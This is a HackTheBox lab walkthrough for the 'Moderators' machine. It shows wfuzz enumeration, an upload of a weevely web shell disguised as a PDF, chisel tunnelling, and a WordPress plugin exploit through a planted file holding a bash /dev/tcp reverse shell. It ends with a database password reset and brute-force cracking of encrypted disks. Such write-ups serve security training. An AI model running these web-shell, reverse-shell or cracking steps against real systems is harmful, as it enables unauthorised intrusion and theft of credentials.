---
title: HTB | Moderators
author: Zeropio
date: 2022-08-31
categories: [Pentesting, HackTheBox]
tags: [htb, linux, hard, machines]
permalink: /pentesting/htb/machines/moderators
image:
  path: /assets/img/hackthebox/card/Moderators.png
  width: 800
  height: 500
---

# Fingerprint

The nmap gives us:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e (RSA)
|   256 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d (ECDSA)
|_  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Moderators
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

In the webserver we found the following path `/blog.php` with some other links like `/reports.php?report=8121` . We can fuzz this reports:

```console
zero@pio$ wfuzz -c -z range,0-9999 -u "http://10.10.11.173/reports.php?report=FUZZ" --hh 7888
```

We can see between the reports. In the **9798** we found:

![Untitled](/assets/img/hackthebox/labs/moderators/Untitled.png)

The log path is the report in md5, so we can start testing for others log we can visualize:

```console
zero@pio$ wfuzz -c -z range,0-9999,md5 -u "http://10.10.11.173/logs/FUZZ/" --hh 274

	000002590:   200        0 L      0 W        0 Ch        "743c41a921516b04afde48bb48e28ce6"                                                          
	000003479:   200        0 L      0 W        0 Ch        "b071cfa81605a94ad80cfa2bbc747448"                                                          
	000004222:   200        0 L      0 W        0 Ch        "74d90aafda34e6060f9e8433962d14fd"                                                          
	000007613:   200        0 L      0 W        0 Ch        "ce5d75028d92047a9ec617acb9c34ce6"                                                          
	000008122:   200        0 L      0 W        0 Ch        "afecc60f82be41c1b52f6705ec69e0f1"                                                          
	000009799:   200        0 L      0 W        0 Ch        "e21cece511f43a5cb18d4932429915ed"
```

All of them are empty. We can fuzz in them, founding a pdf file in `/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf`:

![Untitled](/assets/img/hackthebox/labs/moderators/Untitled%201.png)

We can travel to that directory, founding a place to upload files.

# Foothold

We can send a basic PHP reverse shell, but it wonâ€™t work. Seems like there are some kind of filter. We can try with `weevely` to generate a payload as:

```console
zero@pio$ weevely generate shell shell.pdf.php
```

Modify the headers in burp, so it appears as a pdf:

```html
Content-Disposition: form-data; name="pdfFile"; filename="shell.pdf.php"
Content-Type: application/pdf

%PDF-1.5
<content>
%%EOF
```

Execute weevely:

```consle
zero@pio$ weevely 'http://10.10.11.173/logs/uploads/shell.pdf.php' shell

weevely> whoami
	www-data
www-data@moderators:/var/www/html/logs/uploads $
```

# Privilege Escalation

We found two users in home, **john** and **lexi**. We can see that the port 8080 is open locally, so we can try using `chisel` to get it:

```console
zero@pio$ chisel server --reverse --port 8000
```

And in the target:

```console
www-data@moderators:/var/www/html/logs/uploads $ ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080
```

We found a Wordpress there, vulnerable to this [exploit](https://www.exploit-db.com/exploits/39591).  Start by creating a user folder:

```console
www-data@moderators:~/html/logs/uploads$ mkdir user
www-data@moderators:~/html/logs/uploads/user$ cat wp-load.php 
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.44/443 0>&1'"); ?>
```

Using the plugin call the exploit while openning a netcat:

```console
zero@pio$ sudo netcat -lvnp 443
Listening on 0.0.0.0 443

zero@pio$ curl "http://localhost:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/user/"
```

Now we are as **lexi** user, we can even get the RSA for a more stable shell. Also, we can change the port forwarding using ssh:

```console
zero@pio$ ssh -L 8080:localhost:8080 -i rsa_lexi lexi@10.10.11.173
```

Searching for creds in the system we found a file. Inspecting it we get:

```console
lexi@moderators:/opt/site.new$ cat wp-config.php

	/** MySQL database username */
	define( 'DB_USER', 'wordpressuser' );
	
	/** MySQL database password */
	define( 'DB_PASSWORD', 'wordpresspassword123!!' );
```

We found in the MySQL the password, but it is encrypted. We can try changing it to **password**:

```console
lexi@moderators:~$ mysql -Dwordpress -uwordpressuser -p'wordpresspassword123!!'
MariaDB [wordpress]> UPDATE `wp_users` SET `user_pass` = '$P$BIsDcvvyUHRF.QKXlJzhA9.kgCsuxL/' WHERE user_login = 'admin';
```

Also, we need to add **moderators.htb** to the `/etc/hosts`{: .filepath} to make it work. If we go to **/wp-admin** it will redirect us in **moderators.htb**. It should look like:

```
127.0.0.1       localhost moderators.htb
```

The credentials **admin:password** will work now. There we can find a RSA for the user **john**. From that user we have access to a new folder with a **vdi** file:

```console
john@moderators:~/stuff/VBOX$ ls -l
	total 118792
	-rwxr-xr-x 1 john john      5705 Sep 18  2020 2019-08-01.vbox
	-rwxr-xr-x 1 john john 121634816 Sep 18  2020 2019.vdi
```

We will use this [tool](https://github.com/axcheron/pyvboxdie-cracker) to crack the password.

```console
zero@pio$ python3 pyvboxdie-cracker.py -v 2019-08-01.vbox -d ./wordlist.txt

	[*] Encrypted drive found :  F:/2019.vdi
	[*] KeyStore information...
	 Algorithm = AES-XTS256-PLAIN64
	 Hash = PBKDF2-SHA256
	 Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
	
	[*] Starting bruteforce...
	 51 password tested...
	
	[*] Password Found = computer
```

We need to adapt the **vbox** file to:

```xml
<?xml version="1.0"?>
<!--
** DO NOT EDIT THIS FILE.
** If you make changes to this file while any VirtualBox related application
** is running, your changes will be overwritten later, without taking effect.
** Use VBoxManage or the VirtualBox Manager GUI to make changes.
-->
<VirtualBox xmlns="http://www.virtualbox.org/" version="1.16-windows">
  <Machine uuid="{528b3540-b8be-4677-b43f-7f4969137747}" name="Moderator 1" OSType="Ubuntu_64" snapshotFolder="Snapshots" lastStateChange="2022-08-11T19:20:46Z">
    <MediaRegistry>
      <HardDisks>
        <HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="./2019.vdi" format="VDI" type="Normal">
          <Property name="CRYPT/KeyId" value="Moderator 1"/>
          <Property name="CRYPT/KeyStore" value="U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&#13;&#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAADssBk3IXYOVlXkLWlDd8JCJ8ZUN8FC&#13;&#10;kVQY8Ovl9vXMMyAAAABu5KwY/KgMH20LHptIADnZJ6gRrgSFLm+s6eJEaJx+ziBO&#13;&#10;AAByl/CysecMVxqIA8QKkYqCcCT+RiMz7PJCBnJ+/oGFI2DqAABAAAAAKGFz0b7a&#13;&#10;q8cFTdpSCXUCgvz+yFWcIi1i2jYow1/CS0CEEATdrtbMxzzANgoenuThAceBWSUQ&#13;&#10;FqJ4CioY8Qm3BA=="/>
        </HardDisk>
      </HardDisks>
    </MediaRegistry>
    <ExtraData>
      <ExtraDataItem name="GUI/LastCloseAction" value="PowerOff"/>
      <ExtraDataItem name="GUI/LastGuestSizeHint" value="2560,1335"/>
      <ExtraDataItem name="GUI/LastNormalWindowPosition" value="0,23,640,480,max"/>
    </ExtraData>
    <Hardware>
      <CPU count="2">
        <PAE enabled="false"/>
        <LongMode enabled="true"/>
        <X2APIC enabled="true"/>
        <HardwareVirtExLargePages enabled="true"/>
      </CPU>
      <Memory RAMSize="2048"/>
      <HID Pointing="USBTablet"/>
      <Boot>
        <Order position="1" device="Floppy"/>
        <Order position="2" device="HardDisk"/>
        <Order position="3" device="DVD"/>
        <Order position="4" device="None"/>
      </Boot>
      <Display controller="VMSVGA" VRAMSize="128" accelerate3D="true"/>
      <BIOS>
        <IOAPIC enabled="true"/>
        <SmbiosUuidLittleEndian enabled="true"/>
      </BIOS>
      <USB>
        <Controllers>
          <Controller name="OHCI" type="OHCI"/>
          <Controller name="EHCI" type="EHCI"/>
        </Controllers>
      </USB>
      <Network>
        <Adapter slot="0" enabled="true" MACAddress="08002799F7EC" type="82540EM">
          <NAT/>
        </Adapter>
      </Network>
      <AudioAdapter codec="AD1980" driver="DirectSound" enabled="true" enabledIn="false"/>
      <RTC localOrUTC="UTC"/>
      <Clipboard/>
      <GuestProperties>
        <GuestProperty name="/VirtualBox/GuestAdd/HostVerLastChecked" value="6.1.34" timestamp="1657117437893678100" flags=""/>
        <GuestProperty name="/VirtualBox/GuestAdd/Revision" value="150636" timestamp="1657117380950198406" flags=""/>
        <GuestProperty name="/VirtualBox/GuestAdd/Version" value="6.1.34" timestamp="1657117380950198404" flags=""/>
        <GuestProperty name="/VirtualBox/GuestAdd/VersionExt" value="6.1.34" timestamp="1657117380950198405" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/MAC" value="08002799F7EC" timestamp="1657117380952151105" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/Name" value="enp0s3" timestamp="1657117380952151107" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/Status" value="Up" timestamp="1657117380952151106" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/V4/Broadcast" value="10.0.2.255" timestamp="1657117380952151103" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/V4/IP" value="10.0.2.15" timestamp="1657117380952151102" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/V4/Netmask" value="255.255.255.0" timestamp="1657117380952151104" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/Count" value="1" timestamp="1657117646084736900" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/OS/Product" value="Linux" timestamp="1657117380950198400" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/OS/Release" value="5.15.0-40-generic" timestamp="1657117380950198401" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/OS/Version" value="#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022" timestamp="1657117380950198402" flags=""/> 
        <GuestProperty name="/VirtualBox/HostInfo/DekMissing" value="1" timestamp="1660245560293252500" flags="RDONLYGUEST"/>
        <GuestProperty name="/VirtualBox/HostInfo/GUI/LanguageID" value="es_ES" timestamp="1660245647071532000" flags=""/>
      </GuestProperties>
    </Hardware>
    <StorageControllers>
      <StorageController name="AHCI" type="AHCI" PortCount="3" useHostIOCache="false" Bootable="true" IDE0MasterEmulationPort="0" IDE0SlaveEmulationPort="1" IDE1MasterEmulationPort="2" IDE1SlaveEmulationPort="3">
        <AttachedDevice type="HardDisk" hotpluggable="false" port="0" device="0">
          <Image uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}"/>
        </AttachedDevice>
      </StorageController>
    </StorageControllers>
    <VideoCapture options="vc_enabled=true,ac_enabled=true,ac_profile=med" fps="25"/>
  </Machine>
</VirtualBox>
```

Now import the machine in virtualbox, with the guest additions installed and the encryption founded. Mounting the machine will lead in an error:

```console
zero@pio$ sudo mount /dev/sda /tmp
mount: /tmp: unknown filesystem type 'crypto_LUKS'
```

We must use this [tool](https://github.com/Diverto/cryptsetup-pwguess/releases) to a successful with the previous wordlist:

```console
zero@pio$ sudo ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sda

# The password is: abc123
```

We will see a file called **distro_update.sh** with the following information:

```console
echo ""
echo "Installing updates.."
passwd='$_THE_best_Sysadmin_Ever_'
echo $passwd|sudo apt-get update

echo "Upgrading..."
echo $passwd|sudo apt-get -y upgrade
```

With the john password we will see that john has all the sudo permission:

```console
john@moderators:~/stuff/VBOX$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on moderators:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on moderators:
    (root) ALL
```
